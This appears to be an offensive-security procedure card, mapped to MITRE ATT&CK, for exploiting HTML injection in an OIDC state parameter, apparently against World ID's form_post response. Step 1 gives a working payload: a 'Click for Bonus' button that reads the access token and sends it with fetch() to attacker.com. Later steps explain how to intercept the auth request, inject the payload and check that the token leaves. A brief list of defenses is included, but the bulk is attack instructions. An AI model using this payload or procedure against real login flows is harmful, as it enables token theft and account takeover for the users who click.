---
id: uuid-proc-2
tags:
  - xss
  - html-injection
  - oidc
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:24.605Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-HTML-into-State-Parameter

## Summary

This procedure injects malicious HTML, such as a clickable button, into the OIDC state parameter to create an interactive element in the form_post response, enabling token capture upon user interaction.

## Description

Exploiting the lack of sanitization, attackers craft a state payload with HTML that includes JavaScript to exfiltrate data. In the World ID context, this renders a button in the authentication form that sends the access token to an attacker site when clicked. Prerequisites include confirmed injection from prior reconnaissance; outcomes lead to minimal-interaction token theft, partially mitigated by CSP.

## Requirements

1. Confirmed injection vulnerability from identification step
2. Attacker-controlled endpoint (e.g., webhook or simple server) for receiving data
3. Proxy tool to modify state in real-time during auth flow

## Defense

Defensive measures and detection strategies:

- Sanitize state parameter by stripping HTML tags and encoding special characters
- Use HTTP-only cookies for tokens instead of form fields
- Implement client-side validation and anomaly detection in auth responses

## Objectives

1. Render malicious HTML in the authentication response
2. Create an interactive element for token extraction
3. Minimize required user interaction for exploitation

## Instructions

### Step 1: Craft Payload

**Context**: Design HTML payload that includes access token reference and exfiltration.

Create payload: `<button onclick="var token = document.querySelector('input[name=access_token]').value; fetch('https://attacker.com/steal?token=' + encodeURIComponent(token));">Click for Bonus</button>`.

> Ensure payload is URL-encoded if needed for the state param.

### Step 2: Inject into Request

**Context**: Modify the authorization request's state parameter.

Intercept the OIDC auth request and set `state=<your_payload>`. Submit to trigger form_post response.

> Payload renders in the callback form body.

### Step 3: Verify Rendering

**Context**: Complete flow and inspect for successful injection.

Allow the response to load; check if button appears and test click (use dev tools to simulate if needed).

> Network tab shows fetch to attacker endpoint on click.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[html-injection]]
- [[oidc]]
